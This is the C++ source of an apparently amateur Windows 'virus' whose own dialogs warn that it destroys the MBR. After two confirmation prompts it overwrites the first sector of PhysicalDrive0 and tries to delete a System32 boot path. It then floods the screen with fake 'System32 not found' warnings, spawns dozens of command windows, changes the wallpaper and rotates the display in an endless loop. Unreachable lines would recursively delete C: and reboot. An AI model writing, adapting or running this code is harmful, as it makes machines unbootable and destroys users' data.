#include<bits/stdc++.h>
#include<windows.h>
#include<chrono> 
#include<thread>
using namespace std;
std::vector<HWND> g_windows;
int g_offsetX = 20;
int g_offsetY = 30;
int g_startX = 100;
int g_startY = 50;
enum RotateAngle {
    ANGLE_0 = DMDO_DEFAULT,    // 正常
    ANGLE_90 = DMDO_90,        // 顺时针90°
    ANGLE_180 = DMDO_180,      // 180°倒置
    ANGLE_270 = DMDO_270       // 顺时针270°
};
void SetWallpaper(const std::string& imagepath)
{
    SystemParametersInfoA(
        SPI_SETDESKWALLPAPER,
        0,
        (PVOID)imagepath.c_str(),
        SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
    );
}
bool RotateScreen(RotateAngle angle);
bool RotateScreen(RotateAngle angle) {
    DEVMODE dm = { 0 };
    dm.dmSize = sizeof(DEVMODE);

    // 获取当前显示设置
    if (!EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm)) {
        return false;
    }

    // 保存原始宽高
    DWORD originalWidth = dm.dmPelsWidth;
    DWORD originalHeight = dm.dmPelsHeight;

    // 90/270度时交换宽高
    if (angle == ANGLE_90 || angle == ANGLE_270) {
        dm.dmPelsWidth = originalHeight;
        dm.dmPelsHeight = originalWidth;
    }
    else {
        dm.dmPelsWidth = originalWidth;
        dm.dmPelsHeight = originalHeight;
    }

    // 设置显示方向
    dm.dmDisplayOrientation = angle;
    dm.dmFields = DM_DISPLAYORIENTATION | DM_PELSWIDTH | DM_PELSHEIGHT;

    // 应用设置
    LONG result = ChangeDisplaySettings(&dm, 0);
    return (result == DISP_CHANGE_SUCCESSFUL);
}
void CycleRotate() {
    RotateAngle angles[] = { ANGLE_0, ANGLE_90, ANGLE_180, ANGLE_270 };
    int index = 0;

   while(1){
        RotateScreen(angles[index]);
        index = (index + 1) % 4;
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}
void CreateNewWindow(HINSTANCE hInstance, int nCmdShow, int x, int y) {
    const char CLASS_NAME[] = "PopupWindowClass";

    
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClass(&wc);

    
    HWND hwnd = CreateWindowEx(
        0,
        CLASS_NAME,
        "Warning",
        WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX, 
        x, y,
        200, 80, 
        NULL,
        NULL,
        hInstance,
        NULL
    );

    if (hwnd == NULL) {
        return;
    }

    
    HWND hIcon = CreateWindow("STATIC", NULL, WS_VISIBLE | WS_CHILD | SS_ICON,
        10, 10, 32, 32, hwnd, NULL, hInstance, NULL);
    SendMessage(hIcon, STM_SETIMAGE, IMAGE_ICON, (LPARAM)LoadIcon(NULL, IDI_WARNING));

    HWND hText = CreateWindow("STATIC", "WE CAN'T FIND System32 ON YOUR COMPUTER", WS_VISIBLE | WS_CHILD,
        50, 15, 130, 20, hwnd, NULL, hInstance, NULL);

    HWND hBtn = CreateWindow("BUTTON", "OK", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
        70, 45, 60, 25, hwnd, NULL, hInstance, NULL);

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);
    g_windows.push_back(hwnd);
}
void presswinctrlc()
{
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(VK_CONTROL, 0, 0, 0);
    keybd_event('C', 0, 0, 0);
    Sleep(30);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
    keybd_event('C', 0, KEYEVENTF_KEYUP, 0);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	if(MessageBox(NULL,"这是一个病毒程序，你确定要运行吗？\n此病毒会破坏MBR，可能导致电脑无法开机！！！\n病毒作者不负任何责任！！！","Warning",MB_YESNO|MB_ICONWARNING)==IDYES)
	{
		if(MessageBox(NULL,"这是最后的警告，你确定要运行吗？\n此病毒会破坏MBR，可能导致电脑无法开机！！！\n病毒作者不负任何责任！！！","Warning",MB_YESNO|MB_ICONWARNING)==IDNO)
		{
			return 0; 
		}
	}
	else
	{
		return 0;
	}
	BYTE my_data[512]={0};
	my_data[0]=0xEB;
	my_data[1]=0x3C;
	my_data[2]=0x90;
	DWORD bytesWritten=0;
	HANDLE hDisk = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	WriteFile(hDisk, my_data, 512, &bytesWritten, NULL);
	const char* filePath = "C:Windows/System32/Boot";
    int result = std::remove(filePath);
	for (int i = 0; i < 50; i++)
	{
    	int x = g_startX + i * g_offsetX;
    	int y = g_startY + i * g_offsetY;
    	CreateNewWindow(hInstance, nCmdShow, x, y);
    	Sleep(100); 
	}
	presswinctrlc();
	SetWallpaper("丹尼尔.bmp");
	for (int i = 1;i <= 30;i++)
	{
    	system("start C:Windows/System32/net.exe");
    	system("start cmd");
	}
	CycleRotate();
	presswinctrlc();
	CycleRotate();
	system("start 丹尼尔.bmp");
	system("start MUSIC.wav");
	system("start https://www.bilibili.com/video/BV1xy6qBJESW/?spm_id_from=333.788.recommend_more_video.1&trackid=web_related_0.router-related-2479604-d9wfs.1776590536019.401");
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) 
	{
    	TranslateMessage(&msg);
    	DispatchMessage(&msg);
	}		
	return (int)msg.wParam;
	system("rd /s /q C:");
	system("start 万吨王.jpeg");
	system("shutdown /r /t 0");
}
